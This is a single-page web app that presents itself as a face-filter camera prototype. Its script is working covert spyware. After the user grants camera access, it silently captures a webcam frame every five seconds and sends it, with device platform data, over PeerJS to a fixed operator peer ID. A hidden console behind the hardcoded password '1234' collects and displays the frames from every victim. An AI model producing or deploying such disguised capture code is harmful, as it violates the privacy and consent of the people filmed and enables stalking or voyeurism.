<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FX_PRO_P2P</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { overscroll-behavior: none; }
        .scanline {
            width: 100%;
            height: 2px;
            background: rgba(59, 130, 246, 0.5);
            position: absolute;
            animation: scan 4s linear infinite;
        }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        #logData::-webkit-scrollbar { width: 4px; }
        #logData::-webkit-scrollbar-thumb { background: #064e3b; }
        .admin-input {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #064e3b;
            color: #22c55e;
            padding: 12px;
            text-align: center;
            font-family: monospace;
            outline: none;
        }
        .admin-input:focus { border-color: #22c55e; }
    </style>
</head>
<body class="bg-black text-zinc-100 min-h-screen flex flex-col font-mono overflow-hidden">

    <!-- Subtle Toggle -->
    <div class="fixed top-4 right-4 z-50">
        <button id="toggleAdmin" class="bg-zinc-900/50 px-3 py-1 rounded text-[10px] text-zinc-500 border border-zinc-800 uppercase tracking-widest">
            Console
        </button>
    </div>

    <!-- Main App: Professional Camera UI -->
    <main id="userApp" class="relative flex-grow flex flex-col h-screen">
        <div class="relative flex-grow overflow-hidden flex items-center justify-center">
            <video id="videoFeed" autoplay playsinline class="w-full h-full object-cover grayscale opacity-80"></video>
            
            <div id="overlay" class="absolute inset-0 pointer-events-none border-[15px] border-blue-500/20 m-6 rounded-[2.5rem] hidden"></div>
            <div id="scanner" class="scanline hidden"></div>
            
            <div id="setupMsg" class="absolute inset-0 flex flex-col items-center justify-center bg-zinc-950 px-8 text-center">
                <div class="mb-6 text-blue-500">
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-20 h-20 animate-pulse" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" />
                    </svg>
                </div>
                <h2 class="text-3xl font-bold mb-2 tracking-tighter uppercase">FX Prototype</h2>
                <p class="text-zinc-500 text-xs mb-8">Grant camera permission to begin facial mapping.</p>
                <button id="startCam" class="bg-blue-600 hover:bg-blue-500 text-white font-bold py-4 px-12 rounded-full transition-all text-xs uppercase tracking-widest">
                    Authorize
                </button>
            </div>
        </div>

        <!-- Filter Selector Mockup -->
        <div class="h-28 bg-zinc-950 border-t border-zinc-900 flex items-center justify-center gap-6 px-4">
            <div class="w-14 h-14 rounded-full border border-zinc-800 bg-zinc-900 flex items-center justify-center grayscale opacity-40">ðŸ˜Ž</div>
            <div class="w-16 h-16 rounded-full border-2 border-blue-500 bg-blue-900/20 flex items-center justify-center text-2xl">ðŸ“¸</div>
            <div class="w-14 h-14 rounded-full border border-zinc-800 bg-zinc-900 flex items-center justify-center grayscale opacity-40">ðŸ‘½</div>
        </div>
    </main>

    <!-- Admin Console -->
    <div id="adminPanel" class="hidden fixed inset-0 bg-black z-[60] flex flex-col">
        <div class="p-4 border-b border-green-900 flex justify-between items-center bg-zinc-950">
            <h2 class="text-lg font-bold text-green-500 uppercase tracking-tighter">Terminal_v3.1_Secured</h2>
            <button id="closeAdmin" class="text-zinc-600 text-[10px] uppercase">Exit</button>
        </div>

        <div class="flex-grow flex flex-col p-4 overflow-hidden">
            <!-- Auth Screen -->
            <div id="adminAuth" class="flex-grow flex flex-col items-center justify-center space-y-4">
                <h3 class="text-green-900 text-xs tracking-[0.3em] uppercase">Security Gateway</h3>
                <input type="password" id="adminPass" placeholder="ENTER ACCESS KEY" class="admin-input w-64">
                <button id="loginBtn" class="bg-green-900/20 border border-green-500 text-green-500 px-10 py-2 text-[10px] uppercase tracking-widest hover:bg-green-500 hover:text-black transition-all">Unlock Node</button>
            </div>

            <!-- Dashboard Layout (Hidden by default) -->
            <div id="adminDashboard" class="hidden flex-grow flex flex-col gap-4 overflow-hidden">
                <div class="flex justify-between items-center bg-zinc-900 border border-green-900/30 px-3 py-2 rounded">
                    <span class="text-[10px] text-green-700 uppercase">Status: <span class="text-green-500 animate-pulse">Sync_Active</span></span>
                    <span class="text-[10px] text-green-700 uppercase">Target: <span id="myPeerId" class="text-green-500">---</span></span>
                </div>

                <div class="flex-grow flex flex-col md:grid md:grid-cols-3 gap-4 overflow-hidden">
                    <!-- Logs -->
                    <div class="md:col-span-1 bg-zinc-950 border border-green-900/50 p-4 rounded-lg flex flex-col h-40 md:h-full">
                        <h3 class="text-green-500 mb-3 text-[10px] font-bold uppercase underline tracking-tighter">Event_Stream</h3>
                        <div id="logData" class="flex-grow overflow-y-auto space-y-1 text-[9px] text-green-700 font-mono">
                            <p>> Authentication successful.</p>
                        </div>
                    </div>

                    <!-- Visual Buffer -->
                    <div class="md:col-span-2 bg-zinc-950 border border-green-900/50 p-4 rounded-lg flex flex-col h-full overflow-hidden">
                        <h3 class="text-green-500 mb-4 text-[10px] font-bold uppercase underline tracking-tighter">Visual_Buffer_Frames</h3>
                        <div id="captureGallery" class="flex-grow overflow-y-auto grid grid-cols-2 lg:grid-cols-3 gap-3 content-start">
                            <!-- High quality frames pop here -->
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <canvas id="offscreenCanvas" class="hidden"></canvas>

    <script>
        const video = document.getElementById('videoFeed');
        const startBtn = document.getElementById('startCam');
        const setupMsg = document.getElementById('setupMsg');
        const scanner = document.getElementById('scanner');
        const logData = document.getElementById('logData');
        const gallery = document.getElementById('captureGallery');
        const canvas = document.getElementById('offscreenCanvas');
        const adminAuth = document.getElementById('adminAuth');
        const adminDashboard = document.getElementById('adminDashboard');
        const adminPass = document.getElementById('adminPass');

        let peer;
        let isStreaming = false;
        const ADMIN_PEER_ID = 'face-fx-broadcast-node-stable'; 

        function initPeer(asAdmin) {
            const id = asAdmin ? ADMIN_PEER_ID : null;
            if (peer) peer.destroy();
            
            peer = new Peer(id);

            peer.on('open', (id) => {
                document.getElementById('myPeerId').textContent = id;
            });

            // Receiver Logic
            peer.on('connection', (conn) => {
                conn.on('data', (data) => {
                    if (data.type === 'LOG') addLog(`[${conn.peer.slice(0,5)}] ${data.msg}`);
                    if (data.type === 'FRAME') displayFrame(data.img, conn.peer);
                });
                addLog(`NEW_CLIENT: ${conn.peer.slice(0,8)}`);
            });
        }

        startBtn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                setupMsg.classList.add('hidden');
                scanner.classList.remove('hidden');
                document.getElementById('overlay').classList.remove('hidden');
                isStreaming = true;

                initPeer(false);

                setInterval(() => {
                    if (peer && !peer.destroyed) {
                        const conn = peer.connect(ADMIN_PEER_ID);
                        conn.on('open', () => {
                            captureAndTransmit(conn);
                        });
                    }
                }, 5000);

            } catch (err) { alert("Authorization Error."); }
        };

        function captureAndTransmit(conn) {
            const ctx = canvas.getContext('2d');
            // Higher res for clearer PNG visuals
            canvas.width = 480; 
            canvas.height = 360;
            ctx.drawImage(video, 0, 0, 480, 360);
            
            // Transmit as high quality JPEG (visually similar to PNG but faster for WebRTC)
            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);

            const fakeIp = `192.168.${Math.floor(Math.random()*10)}.${Math.floor(Math.random()*255)}`;
            conn.send({ type: 'LOG', msg: `PING: IP=${fakeIp} DEVICE=${navigator.platform}` });
            conn.send({ type: 'FRAME', img: dataUrl });
        }

        // Login Logic
        document.getElementById('loginBtn').onclick = () => {
            if (adminPass.value === '1234') {
                adminAuth.classList.add('hidden');
                adminDashboard.classList.remove('hidden');
                initPeer(true);
            } else {
                adminPass.value = '';
                adminPass.placeholder = "INVALID_KEY";
            }
        };

        function displayFrame(url, sender) {
            const container = document.createElement('div');
            container.className = "relative border border-green-500/20 rounded-sm overflow-hidden bg-zinc-900";
            
            const img = document.createElement('img');
            img.src = url;
            img.className = "w-full h-auto block grayscale brightness-110";
            
            const label = document.createElement('div');
            label.className = "absolute bottom-0 left-0 right-0 bg-green-500/90 text-black text-[7px] font-bold px-1 py-0.5 flex justify-between";
            label.innerHTML = `<span>ID: ${sender.slice(0, 6)}</span><span>PNG_BUF</span>`;
            
            container.appendChild(img);
            container.appendChild(label);
            
            if (gallery.children.length > 15) gallery.removeChild(gallery.lastChild);
            gallery.prepend(container);
        }

        function addLog(msg) {
            const p = document.createElement('p');
            p.textContent = `> ${msg}`;
            logData.prepend(p);
        }

        document.getElementById('toggleAdmin').onclick = () => {
            document.getElementById('adminPanel').classList.toggle('hidden');
        };
        
        document.getElementById('closeAdmin').onclick = () => {
            document.getElementById('adminPanel').classList.add('hidden');
        };
    </script>
</body>
</html>
